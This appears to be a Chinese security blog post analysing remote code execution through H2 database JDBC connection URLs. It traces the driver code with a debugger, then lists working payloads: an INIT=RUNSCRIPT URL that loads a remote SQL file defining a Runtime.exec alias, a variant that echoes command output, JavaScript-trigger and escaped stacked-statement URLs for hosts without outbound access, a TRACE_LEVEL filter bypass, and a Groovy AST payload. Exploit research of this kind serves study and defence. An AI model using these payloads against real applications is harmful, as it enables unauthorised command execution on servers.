# Java JDBC Attack-H2

  
  
&lt;!--more--&gt;  
## 0x01 漏洞分析  
pom.xml  
```xml  
&lt;dependency&gt;    
    &lt;groupId&gt;com.h2database&lt;/groupId&gt;    
    &lt;artifactId&gt;h2&lt;/artifactId&gt;    
    &lt;version&gt;2.0.204&lt;/version&gt;    
&lt;/dependency&gt;  
```  
Demo  
```java  
import java.sql.Connection;    
import java.sql.DriverManager;    
    
public class JDBC_H2Database {    
    public static void main(String[] args) throws Exception {    
        String ClassName = &#34;org.h2.Driver&#34;;    
        String JDBC_Url = &#34;jdbc:h2:mem:test;INIT=RUNSCRIPT FROM &#39;http://127.0.0.1:8888/poc.sql&#39;&#34;;    
        String username = &#34;root&#34;;    
        String password = &#34;root&#34;;    
        Class.forName(ClassName);    
        Connection connection = DriverManager.getConnection(JDBC_Url, username, password);    
    }    
}  
```  
poc.sql  
```sql  
DROP ALIAS IF EXISTS shell;  
CREATE ALIAS shell AS $$void shell(String s) throws Exception {  
    java.lang.Runtime.getRuntime().exec(s);  
}$$;  
SELECT shell(&#39;open -a Calculator&#39;);  
```  
在`getConnection()`打断点调试，跟进到`org.h2.Driver#connect()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501172219414.png)
在这里调用了 JdbcConnection 构造函数，跟进查看，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501172220508.png)
调用了`ConnectionInfo()`处理了 url，再调用了`SessionRemote(ci).connectEmbeddedOrServer`继续跟进  
这里调用了`Engine.createSession`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501172222020.png)
跟进这里的`openSession()`，因为`init`不为空，所以会执行`prepareLocal()`和`executeUpdate`，跟进`prepareLocal()`，调用了`prepareCommand`解析 sql 字符串，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501172224466.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501172225123.png)
解析完了sql字符串之后，进入到了`CommandContainer()`方法中，之后进行了返回进入到`command.executeUpdate()`方法中  
进入到`update()`方法中  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501172255989.png)
继续进入到`prepared.update()`方法中  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501172255128.png)
`prepared`就是`RunScriptCommand`类，所以进入到了其`update()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501172256197.png)
接下来就行一条条执行 sql 语句  
其中`openInput()`，会从远端读取 sql 文件  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501172305324.png)
## 0x02 POC  
由于JDBC连接时`INIT`只能执行一条SQL语句，所以攻击方式比较有限  
出网，打 RUNSCRIPT  
```java  
jdbc:h2:mem:test;INIT=RUNSCRIPT FROM &#39;http://127.0.0.1:8888/evil.sql&#39;  
DROP ALIAS IF EXISTS shell;  
CREATE ALIAS shell AS $$void shell(String s) throws Exception {  
    java.lang.Runtime.getRuntime().exec(s);  
}$$;  
SELECT shell(&#39;open -a Calculator&#39;);  
```  
回显  
```java  
CREATE ALIAS SHELLEXEC AS $$String shellexec(String cmd) throws java.io.IOException{  
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&#34;\\A&#34;);   
    return s.hasNext() ? s.next() : &#34;&#34;;   
}$$;  
  
CALL SHELLEXEC(&#39;whoami&#39;);  
```  
不出网 jdk&lt;15  
poc1  
H2和MySQL一样有INFORMATION_SCHEMA。H2提取URL中的配置时是通过分割分号`;`来提取的，因此JS代码中不能有分号，否则会报错（可以加上反斜杠代表转义），`//javascript`是H2的语法  
在H2内存数据库中创建一个触发器 TRIG_JS，该触发器在向 INFORMATION_SCHEMA.TABLES 表插入数据后执行。触发器的主体是一个JavaScript脚本  
```java  
String url = &#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;)\n$$\n&#34;;  
```  
poc2  
转义多次，利用 init 塞两条语句进去  
```  
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \&#34;1\&#34;\\;}&#39;\\;CALL EXEC (&#39;open -a Caulator&#39;)  
```  
绕过  
INIT被过滤的时候，`TRACE_LEVEL_SYSTEM_OUT`,`TRACE_LEVEL_FILE`,`TRACE_MAX_FILE_SIZE`能触发堆叠注入，分号需要转义  
```java  
jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=1\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript  
Java.type(&#34;java.lang.Runtime&#34;).getRuntime().exec(&#34;calc&#34;)$$--  
```  
其中，如果目标机器存在groovy依赖，能打 AST 注解  
```xml  
&lt;dependency&gt;  
    &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;  
    &lt;artifactId&gt;groovy-sql&lt;/artifactId&gt;  
    &lt;version&gt;3.0.8&lt;/version&gt;  
&lt;/dependency&gt;  
```  
```java  
String url = &#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS &#39;@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;)})def x&#39;&#34;;  
```  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/java-jdbc-attack-h2/  

